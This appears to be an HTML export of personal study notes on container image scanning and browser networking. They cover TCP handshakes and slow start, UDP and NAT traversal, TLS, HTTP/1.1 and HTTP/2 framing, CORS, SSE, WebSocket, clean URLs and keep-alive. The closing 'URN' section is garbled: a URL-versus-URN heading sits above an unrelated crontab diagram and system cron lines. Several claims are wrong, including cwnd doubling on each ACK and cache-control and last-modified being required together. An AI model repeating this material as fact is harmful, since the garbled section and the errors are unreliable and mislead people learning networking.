<pre><code>grype /root/webapp-sbom.json -o json --file /root/grype-report.json
</code></pre>
</li>
</ul>
<h4 id="kube-linter-1"><a class="header" href="#kube-linter-1">Kube-linter</a></h4>
<ul>
<li>Kube-linter can be used to lint Kubernetes manifests and ensure best practices are being followed</li>
<li>kube-linter is configurable. You can disable/enable checks and even create your own custom checks</li>
<li>kube-linter includes recommendations for how to fix failed checks</li>
<li>https://github.com/stackrox/kube-linter</li>
</ul>
<h3 id="scanning-images-for-vulnerabilities-1"><a class="header" href="#scanning-images-for-vulnerabilities-1">Scanning Images for Vulnerabilities</a></h3>
<h4 id="trivy-1"><a class="header" href="#trivy-1">trivy</a></h4>
<ul>
<li>trivy can be used to scan images for vulnerabilities</li>
<li>https://github.com/aquasecurity/trivy</li>
<li>Example:
<pre><code>  sudo docker run --rm  aquasec/trivy:0.17.2 nginx:1.16-alpine
</code></pre>
</li>
</ul>
</h4>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory Map</a></h2>
<ul>
<li><a href="networking/browser-networking">browser-networking</a></li>
<li><a href="networking/http">http</a></li>
<li><a href="networking/load-balancing">load-balancing</a></li>
<li><a href="networking/nginx">nginx</a></li>
<li><a href="networking/rate-limiting">rate-limiting</a></li>
</ul>
<h2 id="protocols"><a class="header" href="#protocols">Protocols</a></h2>
<ul>
<li><a href="#ftp">FTP</a></li>
<li><a href="#dns-2">dns</a></li>
<li><a href="#ftp">ftp</a></li>
<li><a href="#icmp">icmp</a></li>
<li><a href="#imap--pop3">imap/pop3</a></li>
<li><a href="#mqtt">mqtt</a></li>
<li><a href="#nfs-network-file-system">nfs</a></li>
<li><a href="#ntp">ntp</a></li>
<li><a href="#quic">quic</a></li>
<li><a href="#server-message-block-smb">smb</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">smtp</a></li>
<li><a href="#snmp">snmp</a></li>
<li><a href="#ssh">ssh</a></li>
<li><a href="#tls">tls</a></li>
<li><a href="#udp-1">udp</a></li>
<li><a href="networking/protocols/websocket.html">websocket</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
<ul>
<li><a href="#chapter-1">chapter01</a></li>
<li><a href="#chapter-2">chapter02</a></li>
<li><a href="#chapter-3">chapter03</a></li>
<li><a href="#chapter-4">chapter04</a></li>
<li><a href="#chapter09">chapter09</a></li>
<li><a href="#chapter-10">chapter10</a></li>
<li><a href="#chapter-11">chapter11</a></li>
<li><a href="#chapter12">chapter12</a></li>
<li><a href="#chapter-13">chapter13</a></li>
<li><a href="#chapter-15">chapter15</a></li>
<li><a href="#chapter-16">chapter16</a></li>
<li><a href="#chapter-17">chapter17</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-1"><a class="header" href="#chapter-1">Chapter 1</a></h1>
<ul>
<li>There are two critical components that dictate the performance of all network traffic
<ul>
<li>latency - The time it takes from the source to send a packet to the destination receiving it
<ul>
<li>Components of a typical router on the internet that contribute to latency
<ul>
<li>Propagation delay - Amount of time required for a message to travel from source to destination, which a function of distance over speed with which the signal propagates.</li>
<li>Transmission delay - Amount of time required to push all the packet‚Äôs bits onto the link, which is a function of the packet‚Äôs length and the bandwidth of the link.</li>
<li>Processing delay - Amount of time required to process the packet header, check for bit-level errors, and determine the packet‚Äôs destination.</li>
<li>Queuing delay - Amount of time the incoming packet is waiting in the queue until it can be processed.</li>
<li>The total latency between client and server is the sum of all delays just listed</li>
</ul>
</li>
</ul>
</li>
<li>bandwidth - The maximum throughput of a logical or physical communication path</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-2"><a class="header" href="#chapter-2">Chapter 2</a></h1>
<h3 id="the-tcp-3-way-handshake-process"><a class="header" href="#the-tcp-3-way-handshake-process">The TCP 3-way Handshake process:</a></h3>
<ol>
<li>SYN - Client picks a random sequence number x and sends a SYN packet, which may also include additional TCP flags and options</li>
<li>SYN/ACK - Server increments x by 1, picks own random sequence number y, appends its own flags and options, and dispatches the response</li>
<li>ACK - Client increments both x and y by one and completes the handshake by dispatching the last ACK packet in the handshake</li>
</ol>
<h3 id="flow-control"><a class="header" href="#flow-control">Flow control</a></h3>
<ul>
<li>Flow control is a method for preventing the sender from overloading the receiver with data they may not be able to process</li>
<li>Each side of the TCP connection advertises its own receive window (rwnd), which communicates the size of the available buffer space to hold the data</li>
<li>The window size can be changed during a transaction. If the window size changes to 0, this indicates the client cannot receive any more data until it finishes processing the existing buffered data</li>
<li>Each ACK packet carries the latest rwnd on each side of the connection</li>
</ul>
<h3 id="tcp-slow-start"><a class="header" href="#tcp-slow-start">TCP Slow Start</a></h3>
<p>TCP slow start is a congestion control mechanism used in TCP (Transmission Control Protocol), which is one of the core protocols of the Internet. The purpose of TCP slow start is to gradually increase the amount of data sent by a sender until it reaches an optimal level that maximizes network utilization without causing congestion.
When a TCP connection is established between a client and a server, the sender begins by sending a small number of data packets. During the initial phase, the sender‚Äôs transmission rate is low to avoid overwhelming the network or causing congestion. This phase is known as slow start.</p>
<p>Here‚Äôs how TCP slow start works:</p>
<ol>
<li>Connection Establishment: The TCP connection is established between the sender and the receiver.</li>
<li>Initial Congestion Window (cwnd): At the beginning of the connection, the sender sets its congestion window (cwnd) to a small value, usually one or two segments worth of data. The congestion window represents the number of unacknowledged packets that the sender can have in flight at any given time.</li>
<li>Sending Data: The sender starts sending data to the receiver, and it waits for acknowledgments (ACKs) from the receiver for each packet sent.</li>
<li>Doubling cwnd: For each ACK received, the sender increases its congestion window size by doubling it. This means that with every successful round-trip of ACKs, the sender is allowed to send twice as many packets as before.</li>
<li>Exponential Growth: As the sender continues to receive ACKs, the congestion window keeps doubling, leading to an exponential growth in the sender‚Äôs data transmission rate.</li>
<li>Congestion Avoidance: Once the congestion window reaches a certain threshold (known as the slow-start threshold), the congestion control mechanism switches from slow start to congestion avoidance. During congestion avoidance, the sender increases the congestion window linearly instead of exponentially.</li>
<li>Multiplicative Decrease: In case of packet loss, which indicates network congestion, the sender interprets it as a sign of congestion and reduces its congestion window size significantly, implementing a multiplicative decrease.</li>
</ol>
<p>The purpose of TCP slow start is to allow the sender to probe the available bandwidth and avoid overwhelming the network with a sudden surge of data. It provides a conservative approach to ensure network stability while still enabling the sender to ramp up its transmission speed to make efficient use of available resources. Slow start is essential for achieving fairness and stability in TCP-based communication across the Internet.</p>
<h3 id="congestion-avoidance"><a class="header" href="#congestion-avoidance">Congestion Avoidance</a></h3>
<p>It is important to recognize that TCP is designed to use packet loss as a feedback mechanism to help regulate its performance. Slow start initializes the connection with a conservative congestion window, and for every round-trip, doubles the amount of data in flight until it exceeds the receiver‚Äôs flow-control window, a system-configured congestion threshold (ssthresh) or until a packet is lost, at which point the congestion avoidance alogorithm takes over.</p>
<h3 id="optimizing-tcp"><a class="header" href="#optimizing-tcp">Optimizing TCP</a></h3>
<p>Some general guidelines for optimizing TCP on a system:</p>
<ul>
<li>Ensure the system is running the latest kernel</li>
<li>Increase TCP‚Äôs Initial Congestion Window to 10</li>
<li>Disable slow-start after idle to improve performance for long-lived TCP connections, which transfer data in bursts</li>
<li>Enable Window Scaling to increase the maximum receive window size and allow high-latency connections to achieve better throughput</li>
<li>Enable TCP Fast Open to allow data to be sent in the initial SYN packet in certain situations.</li>
<li>Eliminate redundant data transfers. You cannot make the bits travel faster. However, you can reduce the amount of bits that are sent</li>
<li>Compress transferred data</li>
<li>Position servers closer to the user to reduce RTT</li>
<li>Reuse established TCP connections whenever possible</li>
</ul>
<h3 id="inspecting-open-socket-statitistics-on-linux-systems"><a class="header" href="#inspecting-open-socket-statitistics-on-linux-systems">Inspecting open socket statitistics on Linux systems</a></h3>
<p><code>sudo ss --options --extended --memory --processes --info</code> to see current peers and their respective connection settings</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-3"><a class="header" href="#chapter-3">Chapter 3</a></h1>
<h3 id="udp"><a class="header" href="#udp">UDP</a></h3>
<ul>
<li>UDP packets are very simple. They only add an additional 4 headers to the payload. Checksum, length, source port, and destination port. Of which, only length and destination port are required.</li>
</ul>
<h3 id="nat-1"><a class="header" href="#nat-1">NAT</a></h3>
<p>Because UDP does not maintain connection state, NAT devices do not know when a connection is no longer active. NAT Translators expire UDP connections based on a timer. This timer is typically unique across manufacturers of NAT devices.</p>
<h3 id="nat-traversal"><a class="header" href="#nat-traversal">NAT Traversal</a></h3>
<p>NAT can cause issues for client applications that need to be aware of the public IP of the connection. Some example applications are P2P apps such as VOIP, games, and file sharing. To workaround this issue, protocols such as STUN, TURN, and ICE were created.</p>
<ul>
<li>STUN - Session Traversal Utilities for NAT. A protocol that allows the host application to discover the presence of a NAT device on the network, and when present obtain the allocated public IP address and port tuple for the current connection. To do this, the application requires assistance from a well-known, third party STUN server that resides on the network. The IP address of the STUN server can be shared via DNS.</li>
<li>TURN - Traversal Using Relays around NAT. Runs over UDP, but can switch to TCP when it fails. Requires a well-known public relay to shuttle the data between peers.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-4"><a class="header" href="#chapter-4">Chapter 4</a></h1>
<h3 id="ssltls"><a class="header" href="#ssltls">SSL/TLS</a></h3>
<ul>
<li>TLS was designed to operate on top of a reliable transport protocol such as TCP. However, it has also been adapted to run over UDP.</li>
<li>The TLS protocol was designed to provide 3 servers; authentication, encryption, and data integrity. Though, you are not required to use all three in every situation.</li>
<li>In order to establish a cryptographically secure data transfer channel, the peers must agree on a cypher suite and the keys used to encrypt the data. The TLS protocol defines a well-known handshake to perform this exchange, known as the TLS handshake.</li>
<li>TLS uses asymmetric (public key) cryptography.</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter09"><a href="#chapter09" class="header">Chapter09</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-10"><a class="header" href="#chapter-10">Chapter 10</a></h1>
<ul>
<li>The execution of a web app involves three tasks
<ol>
<li>Fetch resources</li>
<li>page layout and rendering</li>
<li>Javascript execution</li>
</ol>
</li>
</ul>
<p>The rendering and scripting steps are symmetric, it is not possible to run them concurrently.</p>
<p>The Navigation Timing API is included in most modern web browsers. It can be used for a wholistic view of page load timing. It includes DNS and TCP connect times with high precision.
The Resource Timing API is also included with most modern browsers can can be used to view the performance profile of a page.
The User Timing API provides a simple JavaScript API to mark and measure application-specific performance metrics with the help of high-resolution timers.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-11"><a class="header" href="#chapter-11">Chapter 11</a></h1>
<h3 id="http-pipelining"><a class="header" href="#http-pipelining">HTTP Pipelining</a></h3>
<p>HTTP Pipelining is a technique used in the HTTP protocol to allow multiple requests to be sent by the client without waiting for a response from the server. The server can respond to these requests in any order, and the client can process the requests as they arrive. HTTP pipelining adoption has remained very limited despite it‚Äôs many benefits. This is because of several drawbacks:</p>
<ol>
<li>A single slow response blocks all requests behind it</li>
<li>When processing requests in parallel, servers must buffer all responses behind the current response. This could lead to resource exhaustion on the server as buffers grow larger and larger.</li>
<li>A failed response may terminate the TCP connection, causing the client to retransmit the request. This could lead to duplicate request processing on the server.</li>
<li>Intermediary devices in the network hop path can cause issues, and compatibility with Intermediary devices is hard to detect. One way around this is to use a secure tunnel, which prevents intermediary devices from reading/modifying the connection.</li>
</ol>
<h3 id="head-of-line-blocking"><a class="header" href="#head-of-line-blocking">Head of Line Blocking</a></h3>
<p>Head of Line blocking can be caused by HTTP pipelining. With HTTP Pipelining, the server processes requests in the order they are received. If a particular request takes a long time to process, the responses for other requests will be blocked.</p>
<h3 id="headers"><a class="header" href="#headers">Headers</a></h3>
<ul>
<li>Headers remain unmodified and are always sent as plain text to remain compatible with previous versions of HTTP. Headers were introduced in HTTP 1.0. Headers typically add 500-800 bytes to the total payload. However, cookies can make them dramatically larger. RFC 2616 does not define a limit on the size of HTTP headers. However, many servers and proxies will try to enforce either an 8 KB or 16 KB limit.</li>
<li>The growing list of headers is not bad in and of itself. However, the fact that all HTTP headers are transferred in plain text (without compression) can lead to high overhead costs for each and every request.</li>
<li>In the example below, we can see that our headers make up 157 bytes of the payload, while the content itself only takes up 15 bytes.</li>
</ul>
<pre><code>$ curl --trace-ascii - -d'{"msg":"hello"}' http://www.igvita.com/api

== Info:   Trying 173.230.151.99:80...
== Info: Connected to www.igvita.com (173.230.151.99) port 80 (#0)
=&gt; Send header, 157 bytes (0x9d)
0000: POST /api HTTP/1.1
0014: Host: www.igvita.com
002a: User-Agent: Mozilla/5.0 Gecko
0049: Accept: */*
0056: Content-Length: 15
006a: Content-Type: application/x-www-form-urlencoded
009b: 
=&gt; Send data, 15 bytes (0xf)
0000: {"msg":"hello"}
</code></pre>
<h3 id="concatination-and-spriting"><a class="header" href="#concatination-and-spriting">Concatination and Spriting</a></h3>
<ul>
<li>Concatination is the ability for HTTP 1.x to bundle multiple JavaScript or CSS files into a single resource</li>
<li>Spriting is the ability for multiple images to be combined into a larger, composite image and sent via a single response.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter12"><a class="header" href="#chapter12">Chapter12</a></h1>
<ul>
<li>HTTP 2.0 introduced a new form of encapsulation which provides more efficient use of network resources and reduced perception of latency by allowing header field compression and multiple concurrent messages on the same connection.</li>
</ul>
<h3 id="binary-framing-layer"><a class="header" href="#binary-framing-layer">Binary Framing Layer</a></h3>
<p>At the core of the HTTP 2.0 enhancements it the HTTP Binary Framing Layer, which dictates how HTTP messages are encapsulated and transmitted between client and server. The ‚Äúlayer‚Äù refers to a design choice to introduce a new mechanism between the socket interface and the higher HTTP API exposed to the application. HTTP 1.x messages are new-line delimited. All HTTP 2.0 communication is split into smaller messages and frames, each of which is encoded in binary format.</p>
<h3 id="streams-messages-and-frames"><a class="header" href="#streams-messages-and-frames">Streams, Messages, and frames</a></h3>
<p>HTTP 2.0 introduced some new terminology. Let‚Äôs go over that now.</p>
<ul>
<li>Stream = a bidirectional flow of bytes within an established HTTP 2.0 connection. All communication is performed within a single TCP connection. Each string has a unique integer identifier.</li>
<li>Message = a complete sequence of frames that map to a logical message. The message is a logical HTTP message, such as a request or response.</li>
<li>Frame = The smallest unit of HTTP communication, each containing a frame header, which at a minimum identifies to which stream the frame belongs. Frames carry specific types of data, such as headers, payloads, etc.</li>
</ul>
<pre><code>TCP Connection
------------------------------------------------------------------------------------------------------------------------------------------
Stream 1:
==============================================================              ==============================================================
Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]
==============================================================              ==============================================================

Stream 2:
==============================================================              ==============================================================
Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   
==============================================================              ==============================================================
------------------------------------------------------------------------------------------------------------------------------------------
</code></pre>
<p>This model provides request and response multiplexing, in which the client can be transmitting frames to the server, and at the same time the server can be transmitting frames to the client. All within a single TCP connection. This essentially eliminates the head-of-line blocking problem!</p>
<h3 id="server-push"><a class="header" href="#server-push">Server Push</a></h3>
<p>HTTP 2.0 also introduces Server Push. With server push, a client may send a single request for a resource, and the server can then send multiple responses back for resources that it knows the client will need. Why would we ever need this? A web page/app consists of multiple resources, all of which are discovered by the client while examining the document provided by the server. If the server knows the client is going to need those additional resources, it can just send them without the client actually requesting them. What if the client doesn‚Äôt want these additional resources? The client has the option to deny the resource being sent by the server. This process is implemented via a ‚ÄúPush Promise‚Äù. All server pushes are initiated with a Push Promise, which signals the servers intent to push resources to the client. The Push Promise frame only contains the HTTP headers of the promised resource. Once the client receives the promise, it has the option to decline the stream if it wants to (i.e. if the resource is already in the local client cache).</p>
<p>Apache‚Äôs MOD_SPDY mod looks for an X-ASSOCIATED-CONTENT header, which lists the resources to be pushed. The server can also just parse the document and infer the resources to be pushed. The strategy for implementing server push is not defined in the RFC, and is left up to the developer.</p>
<h3 id="header-compression"><a class="header" href="#header-compression">Header compression</a></h3>
<p>Each HTTP 1.x transfer carries headers with it that can consume anywhere from 300-800 bytes of overhead per request, and kilobytes more if cookies are required. To reduce this overhead, HTTP 2.0 introduced header compression.</p>
<ul>
<li>Instead of transmitting the same data on each request and response, HTTP 2.0 uses ‚Äúheader tables‚Äù on both the client and server to keep track of previously sent key-value pairs</li>
<li>Header tables persist for the lifetime of the HTTP 2.0 connection and can be incrementally updated</li>
<li>Key-value pairs can be added or replaced</li>
</ul>
<p>The key-value pairs for some headers like ‚Äúmethod‚Äù and ‚Äúscheme‚Äù rarely change during a connection, so a second request within the connection will not need to send these headers, saving several hundred bytes of data.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-13"><a class="header" href="#chapter-13">Chapter 13</a></h1>
<p>The physical properties of the communication channel set hard performance limits on every application. Speed of light and distance between client and server dictate the propagation latency, and the choice of medium (wired vs. wireless) determines the processing, transmission, queueing, and other delays incurred by each data packet. In fact, the performance of most web apps is limited by latency, not by bandwidth. While bandwidth speeds continue to increase, the same cannot be said for latency. As a result, while we cannot make the bits travel any faster, it is crucial that we apply all the possible optimizations at the transport and application layers to eliminate unnecessary round trips, requests, and minimize the distance traveled by each packet.</p>
<ul>
<li>Latency is the bottleneck, and the fastest bits are bits not sent.</li>
</ul>
<h2 id="caching-resources-on-the-client"><a class="header" href="#caching-resources-on-the-client">Caching resources on the client</a></h2>
<ul>
<li>The <code>cache-control</code> header can specify the cache lifetime of a resource</li>
<li>The <code>last-modified</code> and <code>ETag</code> headers provide validation mechanisms for cached resources</li>
<li>You need to specify both the <code>cache-control</code> and <code>last-modified</code> headers. You cannot use one OR the other.</li>
</ul>
<h2 id="optimizing-for-http-20"><a class="header" href="#optimizing-for-http-20">Optimizing for HTTP 2.0</a></h2>
<p>At a minimum:</p>
<ol>
<li>Server should start with a TCP CWND of 10 segments</li>
<li>Server should support TLS with ALPN negotiation</li>
<li>Server should support TLS connection reuse to minimize handshake latency</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-15"><a class="header" href="#chapter-15">Chapter 15</a></h1>
<h1 id="xhr"><a class="header" href="#xhr">XHR</a></h1>
<p>XHR is a browser-level API that allows the client to script data transfers via JavaScript. XHR made it‚Äôs first debut in IE5, and was created by the original team that built the Outlook Web App. It was one of the key technologies behind the Async JavaScript and XML (AJAX) revolution. Prior to XHR, the webpage had to be refreshed to send any state updates between client and server. With XHR, this workflow could be done async and under full control of the application in JavaScript code. XHR is what enabled us to make the leap from building basic web pages to building full web applications.</p>
<h1 id="cors-cross-origin-resource-sharing"><a class="header" href="#cors-cross-origin-resource-sharing">CORS (Cross Origin Resource Sharing)</a></h1>
<p>XHR is a browser-level API that automatically handles myriad low-level details such as caching, handling redirects, content negotiation, authentication, and much more. This serves a dual purpose. First it makes the application APIs much easier to work with, allowing us to focus on the business logic. But, second, it allows the browser to sandbox and enforce a set of security and policy constraints on the application code.</p>
<p>The XHR interfaces enforces strict HTTP semantics on each request. While the XHR API allows the application to add custom HTTP headers (via the SetRequestHeader() method) there are a number of protected headers that are off-limits to application code:</p>
<ul>
<li>Accept-Charset, Accept-Encoding, Access-Control-*</li>
<li>Host, Upgrade, Connection, Referrer, Origin</li>
<li>Cookie, Sec-<em>, Proxy-</em>, and lots more</li>
</ul>
<p>The browser will refuse to override any of the unsafe headers. Protecting the Origin header is the key piece of the ‚Äòsame-origin policy‚Äô applied to all XHR requests.</p>
<ul>
<li>An origin is defined as a triple of application protocol, domain name, and port number (example: https, google.com, 443)</li>
</ul>
<p>The motivation for CORS is simple, the browser stores vulnerable information, such as auth tokens, cookies, and other private metadata, which cannot be leaked across applications.</p>
<p>The browser automatically appends the protected Origin HTTP header, which advertises the origin from where the request is being made. In turn, the remote server is then able to examine the Origin header and decide if it should allow the request by returning an Access-Control-Allow-Origin header in its response.</p>
<ul>
<li>CORS requests omit user credentials such as cookies and auth tokens</li>
</ul>
<h3 id="polling-with-xhr"><a class="header" href="#polling-with-xhr">Polling with XHR</a></h3>
<p>XHR enables a simple and efficient way to sync client updates with the server. Whenever necessary, an XHR request is dispatched by the client to update the appropriate data on the server. However, the same problem, in reverse, is much more difficult. If data is updated on the server, how does the server notify the client? The answer is that the client must poll the server.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-16"><a class="header" href="#chapter-16">Chapter 16</a></h1>
<h3 id="server-sent-events-sse"><a class="header" href="#server-sent-events-sse">Server Sent Events (SSE)</a></h3>
<p>Server-Sent Events (SSE) is a technology that enables a server to send continuous updates or event streams to clients over HTTP. It is a unidirectional communication method where the server pushes data to the client, allowing real-time updates without the need for the client to repeatedly request information. To meet this goal, SSE introduced two components: a new EventSource interface in the browser, which allows the client to receive push notifications from the server as DOM events, and the ‚Äúevent stream‚Äù data format, which is used to deliver the individual updates.</p>
<p>Here‚Äôs how Server-Sent Events work:</p>
<ol>
<li>Establishing a Connection: The client initiates a regular HTTP connection with the server by sending a GET request to a specific URL that handles SSE.</li>
<li>Server Response: Upon receiving the GET request, the server responds with an HTTP header containing the ‚ÄúContent-Type‚Äù field set to ‚Äútext/event-stream‚Äù. This indicates that the server will be sending events rather than a traditional HTTP response.</li>
<li>Event Stream Format: The server sends events in a specific format. Each event is represented as a separate message and consists of one or more lines. Each line can either be an event field or data field. An event field starts with ‚Äúevent:‚Äù followed by the event name, while a data field starts with ‚Äúdata:‚Äù followed by the event data.</li>
<li>Connection Persistence: Unlike traditional HTTP requests, SSE connections persist and remain open until either the server or the client explicitly closes them. This enables the server to send events to the client whenever updates occur.</li>
<li>Event Lifecycle: The server can send events at any time, and the client receives them immediately. The client-side JavaScript code can listen for these events and perform actions or update the user interface based on the received data.</li>
<li>Error Handling: SSE connections can handle errors gracefully. If the connection is lost, the client automatically attempts to reconnect, allowing a reliable and uninterrupted stream of events.</li>
<li>Closing the Connection: The client or server can close the connection at any time. If the client wants to terminate the SSE connection, it can simply close the connection from its end, and the server will recognize that the client is no longer available.</li>
</ol>
<p>Server-Sent Events are often used for real-time notifications, live feeds, chat applications, or any scenario where continuous updates from the server to clients are required. It provides a lightweight and easy-to-use alternative to WebSockets when bidirectional communication is not necessary.</p>
<h3 id="event-stream-protocol"><a class="header" href="#event-stream-protocol">Event Stream Protocol</a></h3>
<p>An SSE event stream is delivered as a streaming HTTP response:</p>
<ol>
<li>The client send a regular HTTP GET request</li>
<li>The server responds with a custom ‚Äútext/event-stream‚Äù content-type header, and then stream the UTF-8 encoded data.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-17"><a class="header" href="#chapter-17">Chapter 17</a></h1>
<h3 id="websocket"><a class="header" href="#websocket">Websocket</a></h3>
<p>Websocket enables bidirectional, message-oriented streaming of text and binary data between client and server. It is the closest thing to a raw network socket in the browser that we have.</p>
<p>The WebSocket resource URL uses its own custom scheme: ws for plain-text communication and wss for encrypted (TLS) communication. Why the custom scheme, instead of http/s? The primary use case for the Websocket protocol is to provide an optimized, bidirectional communication channel between applications running in the browser and server. However, the WebSocket wire protocol can be used outside of the browser and could be negotiated via a non-http exchange.</p>
<p>WebSocket communication consists of messages and application code and does not need to worry about buffering, parsing and reconstructing received data. For example, if the server sends a 1 MB payload, the applications <code>onmessage</code> callback will only be called once the client receives the entire payload.</p>
<p>WebSockets can transfer test or binary data.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="http"><a class="header" href="#http">HTTP</a></h1>
<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
<ul>
<li><a href="#clean-urls">clean_urls</a></li>
<li><a href="#http-persistent-connection">persistent_connections</a></li>
<li><a href="#urn">url-vs-uri-vs-urn</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="clean-urls"><a class="header" href="#clean-urls">Clean URLs</a></h1>
<h2 id="definition-2"><a class="header" href="#definition-2">Definition</a></h2>
<p>Clean URLs, also known as user-friendly URLs, pretty URLs, search engine-friendly URLs, or RESTful URLs, are web addresses (Uniform Resource Locators or URLs) designed to enhance the usability and accessibility of websites, web applications, or web services. They aim to be immediately meaningful to non-expert users, reflect the logical structure of information, and decouple the user interface from the server‚Äôs internal representation.</p>
<h2 id="benefits-4"><a class="header" href="#benefits-4">Benefits</a></h2>
<ul>
<li>Improved usability and accessibility for users.</li>
<li>Enhanced search engine optimization (SEO).</li>
<li>Conformance with the representational state transfer (REST) architectural style.</li>
<li>Consistency in web resource locations, facilitating bookmarking.</li>
<li>Reduced difficulty in changing the resource implementation, as clean URLs don‚Äôt contain implementation details.</li>
<li>Improved security by concealing internal server or application information.</li>
</ul>
<h2 id="structure"><a class="header" href="#structure">Structure</a></h2>
<p>Clean URLs typically consist of a path that represents a logical structure that users can easily understand. They avoid including opaque or irrelevant information such as numeric identifiers, illegible data, or session IDs found in query strings.</p>
<h3 id="examples-6"><a class="header" href="#examples-6">Examples</a></h3>
<ul>
<li>Original URL: <code>http://example.com/about.html</code>
Clean URL: <code>http://example.com/about</code></li>
<li>Original URL: <code>http://example.com/user.php?id=1</code>
Clean URL: <code>http://example.com/user/1</code></li>
<li>Original URL: <code>http://example.com/index.php?page=name</code>
Clean URL: <code>http://example.com/name</code></li>
<li>Original URL: <code>http://example.com/kb/index.php?cat=1&amp;id=23</code>
Clean URL: <code>http://example.com/kb/1/23</code></li>
<li>Original URL: <code>http://en.wikipedia.org/w/index.php?title=Clean_URL</code>
Clean URL: <code>http://en.wikipedia.org/wiki/Clean_URL</code></li>
</ul>
<h2 id="implementation"><a class="header" href="#implementation">Implementation</a></h2>
<p>The implementation of clean URLs involves URL mapping through pattern matching or transparent rewriting techniques on the server side. This ensures that users primarily interact with clean URLs.</p>
<p>For SEO, developers often include relevant keywords in clean URLs and remove unnecessary words, enhancing user-friendliness and search engine rankings.</p>
<h2 id="slug"><a class="header" href="#slug">Slug</a></h2>
<p>A <strong>slug</strong> is the part of a URL that contains human-readable keywords identifying a page. It typically appears at the end of the URL and serves as the name of the resource. Slugs can be automatically generated from page titles or entered manually.</p>
<h3 id="characteristics-of-slugs"><a class="header" href="#characteristics-of-slugs">Characteristics of Slugs</a></h3>
<ul>
<li>Often entirely lowercase.</li>
<li>Accented characters replaced by Latin script letters.</li>
<li>Whitespace characters replaced by hyphens or underscores.</li>
<li>Punctuation marks removed.</li>
<li>Some common words (e.g., conjunctions) may be removed.</li>
</ul>
<p>Slugs provide a brief idea of a page‚Äôs topic, help organize long lists of URLs, and make filenames more descriptive when saving web pages locally.</p>
<p>Websites using slugs include Stack Exchange Network and Instagram for question titles and user-specific URLs.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="http-persistent-connection"><a class="header" href="#http-persistent-connection">HTTP Persistent Connection</a></h1>
<p>HTTP persistent connection, also known as HTTP keep-alive or connection reuse, involves using a single TCP connection for multiple HTTP requests/responses instead of opening new connections for each pair. This method is employed in both HTTP/1.0 (unofficially through an extension) and HTTP/1.1 (officially, with all connections considered persistent unless specified otherwise). It offers several advantages, including reduced latency, CPU usage, network congestion, and enhanced HTTP pipelining. However, it can lead to resource allocation issues on the server if connections are not properly closed. Modern web browsers and Python‚Äôs requests library support HTTP persistent connections.</p>
<h2 id="overview-10"><a class="header" href="#overview-10">Overview</a></h2>
<ul>
<li><strong>Definition</strong>: A method to use a single TCP connection for multiple HTTP requests/responses.</li>
<li><strong>Also Known As</strong>: HTTP keep-alive, connection reuse.</li>
</ul>
<h2 id="versions"><a class="header" href="#versions">Versions</a></h2>
<ul>
<li><strong>HTTP/1.0</strong>: Unofficially implemented through an extension.</li>
<li><strong>HTTP/1.1</strong>: Officially supports persistent connections as a default.</li>
</ul>
<h2 id="advantages"><a class="header" href="#advantages">Advantages</a></h2>
<ol>
<li><strong>Reduced Latency</strong>: Fewer delays in communication.</li>
<li><strong>Lower CPU Usage</strong>: Less processing power required for connection setup and teardown.</li>
<li><strong>Decreased Network Congestion</strong>: Fewer connections lead to less network traffic.</li>
<li><strong>Enhanced HTTP Pipelining</strong>: Efficient request/response processing.</li>
</ol>
<h2 id="disadvantages"><a class="header" href="#disadvantages">Disadvantages</a></h2>
<ul>
<li><strong>Resource Allocation Issues</strong>: Potential server problems due to improperly closed connections.</li>
</ul>
<h2 id="support"><a class="header" href="#support">Support</a></h2>
<ul>
<li><strong>Modern Web Browsers</strong>: Generally support HTTP persistent connections.</li>
<li><strong>Python‚Äôs <code>requests</code> Library</strong>: Also supports this feature.</li>
</ul>
<p>For more detailed information, visit the <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection">Wikipedia article</a>.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="urn"><a href="#urn" class="header">URN</a></h1>
<p>URL vs. URI vs. URN</p>
<pre><code># .---------------- URN
# |                                     .------------- hour (0 - 23)
# |                                  |  .---------- day of month (1 - 31)
# |                                  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |                                  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |                                  |  |  |  |
  -----------------------------------------------------------------
                            ---------------------------------------
https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/

# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
